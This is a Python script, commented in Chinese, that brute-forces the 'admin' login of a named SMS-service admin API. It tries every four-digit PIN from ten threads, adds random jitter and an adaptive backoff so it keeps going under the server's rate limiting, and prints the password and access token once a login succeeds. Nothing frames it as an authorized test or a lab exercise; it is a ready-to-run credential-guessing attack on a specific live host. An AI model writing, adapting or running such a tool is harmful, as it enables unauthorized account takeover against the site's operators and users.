import requests
import json
import itertools
import string
import time
import random
from concurrent.futures import ThreadPoolExecutor
import threading

# --- 配置 ---
TARGET_URL = 'https://admin.king-sms.com/api/v1/auth/login'
TARGET_USERNAME = 'admin'
MAX_THREADS = 10

# 密码生成配置
CHARACTER_SET = string.digits
MIN_LENGTH = 4
MAX_LENGTH = 4
# ----------------

# 全局状态变量
FOUND_PASSWORD = None
ATTEMPT_COUNT = 0

# 💥 自适应延迟的核心变量
# 基础最小延迟 (所有线程每次请求前都会等待的基础秒数)
BASE_DELAY = 1.0
# 锁对象，用于保护 BASE_DELAY 的修改，防止多线程冲突
delay_lock = threading.Lock()


def generate_passwords(chars, min_len, max_len):
    """生成密码生成器"""
    print(f"开始生成长度从 {min_len} 到 {max_len} 的密码...")
    for length in range(min_len, max_len + 1):
        for attempt in itertools.product(chars, repeat=length):
            yield ''.join(attempt)


def attempt_login(password):
    """尝试使用给定的密码进行登录"""
    global FOUND_PASSWORD, ATTEMPT_COUNT, BASE_DELAY

    if FOUND_PASSWORD:
        return

    # 1. 执行基础延迟（每次请求前都等待）
    # 增加一个随机抖动，使请求时间不那么规律
    with delay_lock:
        current_delay = BASE_DELAY
    sleep_time = current_delay + random.uniform(0.1, 0.5)
    time.sleep(sleep_time)

    ATTEMPT_COUNT += 1
    credentials = {
        'username': TARGET_USERNAME,
        'password': password
    }

    try:
        response = requests.post(TARGET_URL, data=credentials, timeout=5)

        # 2. 💥 处理限流（自适应调整逻辑）
        if response.status_code == 429:

            # 尝试从 Retry-After 头部获取服务器建议的等待时间
            retry_after_str = response.headers.get('Retry-After')
            wait_time = 0

            if retry_after_str and retry_after_str.isdigit():
                wait_time = int(retry_after_str)
            else:
                # 如果服务器未提供明确时间，我们使用 BASE_DELAY 的指数增长
                wait_time = current_delay * 2  # 增长系数，例如翻倍

            # 确保等待时间至少有 5 秒
            wait_time = max(wait_time, 5)

            # 🚨 调整全局 BASE_DELAY
            with delay_lock:
                # 将 BASE_DELAY 设置为我们即将等待的时间，让所有线程都慢下来
                BASE_DELAY = wait_time

            print(f'\n🚨🚨🚨 收到 429 Too Many Requests。')
            print(f'   - 线程 {threading.current_thread().name} 暂停 {wait_time} 秒。')
            print(f'   - 新的基础延迟 BASE_DELAY 已调整为 {BASE_DELAY} 秒。')

            time.sleep(wait_time)
            return  # 限流后，当前线程暂停完成，继续下一个密码

        # 3. 检查是否成功
        if response.status_code == 200:
            response_data = response.json()
            if 'access_token' in response_data:
                FOUND_PASSWORD = password
                print(f'\n🎉🎉🎉 成功！找到密码：{password} 🎉🎉🎉')
                print(f'访问令牌: {response_data["access_token"]}')
                return

                # 失败打印
        print(f"尝试 #{ATTEMPT_COUNT}: {password} -> ❌ 状态码 {response.status_code}", end='\r', flush=True)

        # 可选：如果长时间没有遇到 429，可以缓慢降低 BASE_DELAY (例如，每 100 次请求降低 0.1 秒)
        # 注意：这里为了保持简洁和稳定，暂不实现自动降低逻辑。

    except requests.exceptions.RequestException as e:
        print(f"尝试 #{ATTEMPT_COUNT}: {password} -> ⚠️ 请求错误/超时: {e}", end='\r', flush=True)


# --- 主逻辑 ---
if __name__ == '__main__':
    print(f"目标用户: {TARGET_USERNAME}")
    print(f"目标 URL: {TARGET_URL}")
    print(f"并发线程数: {MAX_THREADS}")
    print(f"初始基础延迟 BASE_DELAY: {BASE_DELAY} 秒\n")

    password_generator = generate_passwords(CHARACTER_SET, MIN_LENGTH, MAX_LENGTH)

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for password in password_generator:
            if FOUND_PASSWORD:
                break

            future = executor.submit(attempt_login, password)
            futures.append(future)

        for future in futures:
            if FOUND_PASSWORD:
                future.cancel()
            try:
                future.result()
            except Exception:
                pass

    print(f"\n--- 扫描结束，共尝试 {ATTEMPT_COUNT} 个密码 ---")